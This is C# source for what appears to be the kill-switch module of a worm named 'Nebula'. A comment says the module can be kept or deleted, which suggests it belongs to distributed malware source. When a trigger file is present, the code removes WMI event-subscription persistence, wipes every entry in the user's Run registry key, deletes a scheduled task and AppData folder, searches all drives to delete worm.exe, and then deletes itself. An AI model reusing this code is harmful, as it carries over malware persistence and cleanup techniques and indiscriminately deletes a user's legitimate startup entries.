using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

public static class Kill //this module is added for control u can delete this module if u want to
{
    public static void CheckAndExecute()
    {
        if (File.Exists(@"C:\killme.key")) //the file name and extension or path can be changed
        {
            Execute();
        }
    }

    private static void Execute()
    {
        try
        {
            Process.Start("cmd.exe", "/c wmic /namespace:\\\\root\\subscription PATH __EventFilter DELETE");
            Process.Start("cmd.exe", "/c wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer DELETE");
            Process.Start("cmd.exe", "/c wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding DELETE");

            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                foreach (var v in rk.GetValueNames()) rk.DeleteValue(v, false);
            }
            catch { }

            Process.Start("cmd.exe", "/c schtasks /query | findstr /i \"Nebula\" >nul && schtasks /delete /tn \"NebulaTask\" /f");

            string appPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Nebula");
            if (Directory.Exists(appPath)) Directory.Delete(appPath, true);

            string[] drives = Environment.GetLogicalDrives();
            foreach (string d in drives)
            {
                try
                {
                    var files = Directory.GetFiles(d, "worm.exe", SearchOption.AllDirectories);
                    foreach (var f in files)
                    {
                        File.Delete(f);
                    }
                }
                catch { }
            }

            string self = Process.GetCurrentProcess().MainModule.FileName;
            Process.Start("cmd.exe", $"/c timeout 2 & del \"{self}\"");
        }
        catch { }
    }
}
